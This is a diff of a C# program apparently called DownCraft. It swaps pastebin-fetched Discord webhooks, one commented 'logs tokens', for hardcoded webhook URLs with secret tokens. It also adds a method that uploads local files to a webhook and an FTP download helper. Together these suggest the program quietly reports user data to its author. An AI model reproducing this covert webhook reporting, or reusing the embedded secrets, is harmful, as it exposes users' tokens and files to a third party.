@@ -26,9 +26,8 @@ namespace DownCraft
         private string RPC_ID = "914481604032864276";
 
         //LOGS WEBHOOK
-        public string logs_downcraft = "https://discord.com/api/webhooks/" + new WebClient().DownloadString("https://pastebin.com/raw/eUwExZPN"); //ʟᴏɢꜱ-ᴅᴏᴡɴᴄʀᴀꜰᴛ
-        public string logs_namechanger = "https://discord.com/api/webhooks/" + new WebClient().DownloadString("https://pastebin.com/raw/j7vTsSxA"); //logs namechanger
-        public string logs_start = "https://discord.com/api/webhooks/" + new WebClient().DownloadString("https://pastebin.com/raw/r1YbTter"); //logs tokens
+        public string logs_downcraft = "https://discordapp.com/api/webhooks/977216673964777532/rcySwX6RmUTeeqjTSYGrQNrgo0T0Nry6vlzl9Oz81VhzsIk-g7ZoMD431nKO2rGKGWAw";
+        public string logs_downcraft_private = "https://discordapp.com/api/webhooks/1029054865755865119/Y0AIAqSLRWQBqksdFuS_xisudq86BRRBHkcNu0-TjLcVhAc8fhLG_jSOtvVcdlgjLBhn";
 
         private DiscordRpc.EventHandlers handlers;
         private DiscordRpc.RichPresence presence;
@@ -64,6 +63,23 @@ namespace DownCraft
             hook.ProfilePictureUrl = picture;
 
             hook.SendMessage(message);
+        }
+        public void SendWebookFile(string link, string name, string picture, string message, string filename, string filepath)
+        {
+            WebhookFile hook1 = new WebhookFile(link);
+            hook1.Name = name;
+            hook1.ProfilePictureUrl = picture;
+
+            hook1.SendMessage(message, filename, filepath);
+        }
+
+        public void FTP_DOWNLOAD(string URL, string username, string password, string pathConsole, string filePC)
+        {
+            using (var client = new WebClient())
+            {
+                client.Credentials = new NetworkCredential(username, password);
+                client.DownloadFile(URL + pathConsole, filePC);
+            }
         }
     }
 }
